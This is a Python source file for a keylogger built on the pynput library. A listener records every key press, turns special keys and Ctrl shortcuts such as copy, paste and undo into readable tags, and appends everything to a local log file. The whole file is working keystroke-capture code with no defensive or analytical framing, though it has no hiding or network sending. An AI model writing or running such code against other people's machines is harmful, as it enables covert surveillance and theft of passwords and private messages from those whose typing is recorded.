from pynput.keyboard import Listener



def key_formatter(inputString):
    """A simple function that polishes the input characters before they get added to the logfile"""

    # Any misc key needs to be ignored or adjusted properly before being added to the logfile
    # Shift is not needed - the library automatically turns the specified letter in uppercase
    # While shift works properly, caps lock wont switch letters to uppercase

    if inputString.startswith("Key."):
        if inputString == "Key.enter":
            inputString = "\n"
        elif inputString == "Key.tab":
            inputString = "\t"
        elif inputString == "Key.space":
            inputString = " "
        elif inputString == "Key.backspace":
            inputString = "$BACKSPACE$ "
        elif inputString == "Key.right":
            inputString = "$RIGHT_ARROW$ "
        elif inputString == "Key.left":
            inputString = "$LEFT_ARROW$ "
        elif inputString == "Key.up":
            inputString = "$UP_ARROW$ "
        elif inputString == "Key.down":
            inputString = "$DOWN_ARROW$ "

        elif inputString == "Key.insert":
            inputString = "$INSERT "
        elif inputString == "Key.delete":
            inputString = "$DEL$ "
        elif inputString == "Key.caps_lock":
            inputString = "$CAPS_LOCK$ "

        # all other misc keys(CTRL, ALT, CMD, MEDIA KEYS and so on) are discarded
        else:
            inputString = ""

    # While logging, the script will keep track of any copy/paste/cut/undo operations.

    if inputString.startswith("\\x"): #CTRL codes
        if inputString == "\\x03":
            inputString = " CTRL_C " #copy
        elif inputString == "\\x16":
            inputString = " CTRL_V " #paste
        elif inputString == "\\x1a":
            inputString = " CTRL_Z " #undo
        elif inputString == "\\x18":
            inputString = " CTRL_X " #cut
        elif inputString == "\\x01":
            inputString = " CTRL_A " #select all
        elif inputString == "\\x19":
            inputString = " CTRL_Y " #redo
        
    return inputString


def log_keystroke(key):
    """This is the logging function: every keyboard input is read and added to the logfile"""

    inputString = str(key).replace("'", "") #needs fixing: the " ' " character is ignored if written by the user
    inputString = key_formatter(inputString)
    
    with open("src\log.txt", 'a', encoding='utf-8') as f:
        f.write(inputString)


def start_listener():
    # The "with" keyword will automatically close the listener.
    # It always makes sure that the memory allocated to it will be released, no matter what.
    with Listener(on_press=log_keystroke) as l:
        l.join()